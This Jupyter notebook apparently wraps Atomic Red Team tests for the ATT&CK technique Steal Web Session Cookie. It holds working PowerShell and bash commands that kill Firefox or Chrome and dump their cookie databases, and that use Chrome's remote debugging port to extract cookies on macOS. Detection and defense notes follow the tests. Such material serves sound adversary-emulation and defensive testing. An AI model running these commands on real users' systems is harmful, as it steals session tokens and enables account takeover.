{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "08168314",
   "metadata": {},
   "source": "# T1539 - Steal Web Session Cookie\nAn adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (ex: [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application."
  },
  {
   "cell_type": "markdown",
   "id": "d74ea328",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "d67ab519",
   "metadata": {},
   "source": "### Atomic Test #1 - Steal Firefox Cookies (Windows)\nThis test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Sqlite3 must exist at (#{sqlite3_path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cf84571c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1539 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f1fd0437",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nstop-process -name \"firefox\" -force -erroraction silentlycontinue\n$CookieDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"\n\"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe \"$CookieDBLocation\" | out-file -filepath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "61589dbe",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1539 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "2b5ebbf4",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nremove-item PathToAtomicsFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "84c43d19",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1539 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b04b49d3",
   "metadata": {},
   "source": "### Atomic Test #2 - Steal Chrome Cookies (Windows)\nThis test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Sqlite3 must exist at (#{sqlite3_path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dc2c3bc4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1539 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "fda6ed44",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nstop-process -name \"chrome\" -force -erroraction silentlycontinue\n\"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\" | out-file -filepath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6fafb9f4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1539 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "23552d06",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nremove-item PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0aa56a7b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1539 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6ba88b48",
   "metadata": {},
   "source": "### Atomic Test #3 - Steal Chrome Cookies via Remote Debugging (Mac)\nThe remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.\n\nIf successful, this test will output a list of cookies.\n\nNote: Chrome processes will be killed during this test.\n\nSee https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e\n**Supported Platforms:** macos\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: Install Go\n##### Check Prereq Commands:\n```bash\ngo version\n```\n##### Get Prereq Commands:\n```bash\nbrew install go\n```\n##### Description: Download and compile WhiteChocolateMacademiaNut\n##### Check Prereq Commands:\n```bash\n/tmp/WhiteChocolateMacademiaNut/chocolate -h\n```\n##### Get Prereq Commands:\n```bash\ngit clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git /tmp/WhiteChocolateMacademiaNut\ncd /tmp/WhiteChocolateMacademiaNut\ngo mod init chocolate\ngo mod tidy\ngo build\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e723e02",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1539 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "003e3a0d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nkillall 'Google Chrome'\nsleep 1\nopen -a \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/\nsleep 1\n/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "931d399c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1539 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "4d2643a9",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nrm -rf /tmp/WhiteChocolateMacademiaNut```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c2d5094d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1539 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d99fbed3",
   "metadata": {},
   "source": "## Detection\nMonitor for attempts to access files and repositories on a local system that are used to store browser session cookies. Monitor for attempts by programs to inject into or dump browser process memory."
  },
  {
   "cell_type": "markdown",
   "id": "ad3b6cec",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Security Controls \n Alter security controls to make the system more or less vulnerable to attack. \n\n Manipulating security controls involves making configuration changes to the security settings of a system including things like modifying Group Policies, disabling/enabling autorun for removable media, and tightening or relaxing system firewalls, etc.\n#### Opportunity\nThere is an opportunity to use security controls to stop or allow an adversary's activity.\n#### Use Case\nA defender can harden authentication mechanisms to ensure having just a session cookie is not enough to authenticate with another system.\n#### Procedures\nWeaken security controls on a system to allow for leaking of credentials via network connection poisoning.\nImplement policies on a system to prevent the insecure storage of passwords in the registry. This may force an adversary to revert these changes or find another way to access cached credentials.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}